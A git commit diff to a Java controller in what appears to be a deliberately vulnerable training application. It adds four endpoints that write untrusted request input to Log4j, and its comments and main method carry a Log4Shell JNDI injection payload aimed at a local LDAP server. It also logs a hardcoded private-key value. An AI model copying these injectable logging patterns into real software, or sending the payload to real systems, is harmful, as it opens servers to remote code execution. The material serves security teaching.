6ec4f5bd867c0704ded8153fb758a77ae1136bc4
wangwangping <49153254+wangwangping@users.noreply.github.com>
2025-03-04 09:41:18 +0800

    Update Log4j.java

--- src/main/java/org/joychou/controller/Log4j.java
+++ src/main/java/org/joychou/controller/Log4j.java
@@ -25,6 +25,57 @@ public class Log4j {
     public static void main(String[] args) {
         String poc = "${jndi:ldap://127.0.0.1:1389/0iun75}";
         logger.info(poc);
+        String token = "token";
+        String privateKey = "parivate";
+        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
     }
 
+    /**
+     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
+     * Default: error/fatal/off
+     * Fix: Update log4j to lastet version.
+     */
+    @RequestMapping(value = "/log4j1")
+    public String log4j1(String token) {
+        String privateKey = "parivate";
+        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
+        return token;
+    }
+
+
+    /**
+     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
+     * Default: error/fatal/off
+     * Fix: Update log4j to lastet version.
+     */
+    @RequestMapping(value = "/log4j2")
+    public String log4j2(String token) {
+        String privateKey = "parivate";
+        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
+        return token;
+    }
+
+    /**
+     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
+     * Default: error/fatal/off
+     * Fix: Update log4j to lastet version.
+     */
+    @RequestMapping(value = "/log4j3")
+    public String log4j3(String token) {
+        String privateKey = "parivate";
+        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
+        return token;
+    }
+
+    /**
+     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
+     * Default: error/fatal/off
+     * Fix: Update log4j to lastet version.
+     */
+    @RequestMapping(value = "/log4j4")
+    public String log4j4(String token) {
+        String param = "param";
+        logger.error("something wrong, token: {}, param: {}", token, param);
+        return token;
+    }
 }
